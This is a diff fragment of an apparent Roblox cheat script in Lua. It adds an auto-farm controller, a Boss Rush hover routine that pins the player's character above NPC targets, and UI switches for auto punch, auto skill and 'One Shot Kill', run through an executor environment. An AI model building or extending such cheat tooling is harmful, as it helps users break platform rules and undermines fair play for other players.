+                        cleanupHover()
+                        -- The marker loop takes over immediately. Do not warp back against it.
+                        -- On resuming, the marker's new position becomes the return position.
+                        home = nil
+                    end
+                
+                    local function gatesOpen()
+                        return deps.isBossRushActive() and deps.isOneShotActive()
+                            and deps.isAutoSkillActive() and deps.hasSelectedSkills()
+                    end
+                
+                    local function scan(npcFolder, playerRoot, now)
+                        local seen = {}
+                        local candidate, nearestDistance
+                        for _, object in ipairs(npcFolder:GetDescendants()) do
+                            if object:IsA("Humanoid") then
+                                local model, root = npcParts(object, npcFolder)
+                                if model and object.Health <= 0 then
+                                    seen[object] = true
+                                    local observation = observations[object]
+                                    if not observation or observation.root ~= root or observation.model ~= model then
+                                        observation = { humanoid = object, model = model, root = root, zeroSince = now }
+                                        observations[object] = observation
+                                    end
+                                    if now - observation.zeroSince >= 10 then
+                                        local distance = (root.Position - playerRoot.Position).Magnitude
+                                        if not nearestDistance or distance < nearestDistance then
+                                            candidate, nearestDistance = observation, distance
+                                        end
+                                    end
+                                end
+                            end
+                        end
+                        for humanoid in pairs(observations) do if not seen[humanoid] then observations[humanoid] = nil end end
+                        return candidate
+                    end
+                
+                    local function startHover(character, humanoid, root)
+                        if not home then home = { character = character, humanoid = humanoid, root = root, cframe = root.CFrame } end
+                        local position = locked.root.Position + Vector3.new(0, 10, 0)
+                        local cframe = CFrame.lookAt(position, locked.root.Position, Vector3.zAxis)
+                        local current = { character = character, humanoid = humanoid, root = root, autoRotate = humanoid.AutoRotate, objects = {} }
+                        hover = current
+                        local function own(class, name)
+                            local object = makeInstance(class)
+                            current.objects[#current.objects + 1] = object
+                            object.Name = name
+                            return object
+                        end
+                        local attachment = own("Attachment", "BossRushRecoveryAttachment")
+                        attachment.Parent = root
+                        local alignPosition = own("AlignPosition", "BossRushRecoveryPosition")
+                        alignPosition.Mode = Enum.PositionAlignmentMode.OneAttachment
+                        alignPosition.Attachment0 = attachment
+                        alignPosition.ApplyAtCenterOfMass = true
+                        alignPosition.MaxForce = math.max(root.AssemblyMass * world.Gravity * 20, 50000)
+                        alignPosition.MaxVelocity = 200
+                        alignPosition.Responsiveness = 100
+                        alignPosition.Position = position
+                        alignPosition.Parent = root
+                        local alignOrientation = own("AlignOrientation", "BossRushRecoveryOrientation")
+                        alignOrientation.Mode = Enum.OrientationAlignmentMode.OneAttachment
+                        alignOrientation.Attachment0 = attachment
+                        alignOrientation.MaxTorque = 100000
+                        alignOrientation.MaxAngularVelocity = 50
+                        alignOrientation.Responsiveness = 100
+                        alignOrientation.CFrame = cframe
+                        alignOrientation.Parent = root
+                        current.position, current.orientation = alignPosition, alignOrientation
+                        humanoid.AutoRotate = false
+                        root.CFrame = cframe
+                        root.AssemblyLinearVelocity = Vector3.zero
+                        root.AssemblyAngularVelocity = Vector3.zero
+                    end
+                
+                    local function step()
+                        if destroyed then return end
+                        if not gatesOpen() then controller:Reset(); return end
+                        if deps.isArenaReady and not deps.isArenaReady() then controller:Reset(false); return end
+                        local character, humanoid, root = localParts()
+                        if not character then controller:Reset(false); return end
+                        if hover and (hover.character ~= character or hover.root ~= root or hover.humanoid ~= humanoid) then
+                            controller:Reset(false)
+                        end
+                        local npcFolder = folder()
+                        if not npcFolder then controller:Reset(); return end
+                        local now = clock()
+                        if locked then
+                            local model, targetRoot = npcParts(locked.humanoid, npcFolder)
+                            if not model or model ~= locked.model or targetRoot ~= locked.root or locked.humanoid.Health > 0 then
+                                observations[locked.humanoid] = nil
+                                finishTarget(now >= pauseUntil)
+                                nextScan = 0
+                            end
+                        end
+                        if now >= nextScan then
+                            nextScan = now + 0.1
+                            local candidate = scan(npcFolder, root, now)
+                            if not locked and now >= pauseUntil then locked = candidate end
+                        end
+                        if now < pauseUntil then return end
+                        if locked then
+                            if hover and (not hover.position.Parent or not hover.orientation.Parent) then cleanupHover() end
+                            if not hover then startHover(character, humanoid, root) end
+                            local desired = locked.root.Position + Vector3.new(0, 10, 0)
+                            hover.position.Position = desired
+                            hover.orientation.CFrame = CFrame.lookAt(desired, locked.root.Position, Vector3.zAxis)
+                        end
+                    end
+                
+                    function controller:GetTarget() return locked and locked.model or nil end
+                    function controller:IsHovering() return hover ~= nil end
+                    function controller:Destroy()
+                        if destroyed then return end
+                        destroyed = true
+                        if heartbeat then heartbeat:Disconnect(); heartbeat = nil end
+                        if characterRemoving then characterRemoving:Disconnect(); characterRemoving = nil end
+                        controller:Reset()
+                    end
+                    heartbeat = deps.RunService.Heartbeat:Connect(function()
+                        local ok, err = pcall(step)
+                        if not ok then
+                            controller:Reset()
+                            if deps.warn then deps.warn("Boss Rush recovery: " .. tostring(err)) end
+                        end
+                    end)
+                    characterRemoving = player.CharacterRemoving:Connect(function() controller:Reset(false) end)
+                    return controller
+                end
+                
+                
+                -- AUTO_FARM_NEAR_INTEGRATION
+                local runtime = getgenv and getgenv() or _G
+                local previousNearFarm = runtime.__SigmaAutoFarmNear
+                if type(previousNearFarm) == "table" and type(previousNearFarm.Destroy) == "function" then
+                    pcall(previousNearFarm.Destroy, previousNearFarm)
+                end
+                
+                local function notifyNearFarm(message)
+                    pcall(function() library:ShowNotification(message) end)
+                end
+                
+                local nearSwitch, autoSkillSwitch
+                local nearDependencies = {
+                    Players = Players,
+                    LocalPlayer = LocalPlayer,
+                    Workspace = workspace,
+                    ReplicatedStorage = ReplicatedStorage,
+                    RunService = RunService,
+                    VirtualInputManager = VirtualInputManager,
+                    Game = game,
+                    warn = warn,
+                    isOtherFarmActive = function()
+                        return AutoIsland_Active or AutoBR_Active or AutoBRPunch_Active
+                            or AutoBRExtreme_Active or AutoKokushibo_Active or AutoShadow_Active
+                            or AutoIgnis_Active or AutoKrampus_Active or AutoLevel_Active
+                            or AutoIslandbal_Active or AutoBalraxionTerminator_Active
+                            or AutoRelic_Active or AutoSell_Active or AutoBazaarTokens_Active
+                    end,
+                    onEnabledChanged = function(state, reason)
+                        if not state and nearSwitch then nearSwitch:Set(false) end
+                        if reason then notifyNearFarm(reason) end
+                    end,
+                    onSkillEnabledChanged = function(state, reason)
+                        if not state and BossRushRecovery then BossRushRecovery:Reset() end
+                        if not state and autoSkillSwitch then autoSkillSwitch:Set(false) end
+                        if reason then notifyNearFarm(reason) end
+                    end,
+                }
+                local nearController = createAutoFarmNearController(nearDependencies)
+                BossRushRecovery = createBossRushRecoveryController({
+                    Players = Players,
+                    LocalPlayer = LocalPlayer,
+                    Workspace = workspace,
+                    RunService = RunService,
+                    warn = warn,
+                    isBossRushActive = function()
+                        return AutoBR_Active or AutoBRExtreme_Active
+                    end,
+                    isArenaReady = function() return workspace:FindFirstChild("Spire") ~= nil end,
+                    isOneShotActive = function() return OneShot_Active end,
+                    isAutoSkillActive = function() return nearController:IsAutoSkillEnabled() end,
+                    hasSelectedSkills = function() return #nearController:GetSelectedSkills() > 0 end,
+                })
+                nearController.recoveryController = BossRushRecovery
+                runtime.__SigmaAutoFarmNear = nearController
+                if window.main_frame and typeof(window.main_frame) == "Instance" then
+                    nearController.uiConnection = window.main_frame.Destroying:Connect(function()
+                        nearController:Destroy()
+                        if runtime.__SigmaAutoFarmNear == nearController then runtime.__SigmaAutoFarmNear = nil end
+                    end)
+                end
+                
+                nearSwitch = autoFarmTab:AddSwitch("Auto Farm Near NPC", function(state)
+                    nearController:SetEnabled(state)
+                end)
+                nearSwitch:Set(false)
+                
+                local nearPositionDropdown = autoFarmTab:AddDropdown("Near Farm Method (Above/Below)", function(value)
+                    nearController:SetConfig("position", value)
+                end)
+                for _, position in ipairs({ "Above/Below", "Front/Behind" }) do
+                    nearPositionDropdown:Add(position)
+                end
+                
+                autoFarmTab:AddTextBox("Near Farm Distance (-20 to 20, default 20)", function(text)
+                    if not nearController:SetConfig("offset", text) then
+                        notifyNearFarm("Near Farm Distance: enter a number from -20 to 20.")
+                    end
+                end)
+                autoFarmTab:AddSwitch("Near Auto Punch (Lazy Hub)", function(state)
+                    nearController:SetConfig("autoPunch", state)
+                end):Set(true)
+                local nearPunchSpeed = autoFarmTab:AddDropdown("Near Punch Speed (default 0.2)", function(value)
+                    nearController:SetConfig("punchSpeed", value)
+                end)
+                for index = 1, 10 do nearPunchSpeed:Add(string.format("%.1f", index / 10)) end
+                local nearPunchType = autoFarmTab:AddDropdown("Near Punch Type (Normal)", function(value)
+                    nearController:SetConfig("punchType", value)
+                end)
+                nearPunchType:Add("Normal")
+                nearPunchType:Add("Slam")
+                local nearSkillDropdown = autoFarmTab:AddDropdown("Select Skills (click to toggle)", function(name)
+                    if nearController:ToggleSkill(name) then
+                        local selected = nearController:GetSelectedSkills()
+                        notifyNearFarm(#selected > 0 and "Selected: " .. table.concat(selected, ", ") or "Select Skills")
+                    end
+                end)
+                for _, name in ipairs({ "Z", "X", "C", "V", "B", "N", "G", "J" }) do nearSkillDropdown:Add(name) end
+                autoSkillSwitch = autoFarmTab:AddSwitch("Auto Skill (Lazy Hub)", function(state)
+                    nearController:SetAutoSkill(state)
+                end)
+                autoSkillSwitch:Set(false)
+                -- END_AUTO_FARM_NEAR_INTEGRATION
+                
+            end
 
             autoFarmTab:AddSwitch("One Shot Kill", function(state)
                 OneShotMode(state)
